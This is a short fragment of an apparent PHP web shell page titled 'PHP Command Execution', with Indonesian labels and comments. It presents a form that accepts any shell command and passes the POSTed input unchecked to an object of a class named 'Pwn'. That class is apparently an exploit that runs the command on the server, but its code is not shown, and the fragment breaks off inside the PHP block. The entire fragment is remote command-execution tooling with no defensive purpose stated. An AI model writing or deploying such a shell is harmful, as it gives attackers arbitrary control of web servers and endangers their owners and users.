    ...
    <head>
        ...
        <title>PHP Command Execution</title>
    </head>
    <body>
        <h1>PHP Command Execution</h1>
        <form action="" method="post">
            <label for="cmd">Masukkan perintah:</label><br>
            <input type="text" id="cmd" name="cmd" placeholder="Contoh: ls -la"><br>
            <input type="submit" value="Jalankan Perintah">
        </form>
        <hr>
        <h2>Hasil Eksekusi Perintah:</h2>
        <?php
        // Periksa apakah permintaan adalah POST
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            // Periksa apakah input "cmd" dikirimkan dalam permintaan POST
            if (isset($_POST["cmd"])) {
                // Tangkap nilai dari input "cmd"
                $cok = $_POST["cmd"];
                // Buat objek Pwn dengan perintah yang diberikan
                new Pwn($cok);
            }
        }
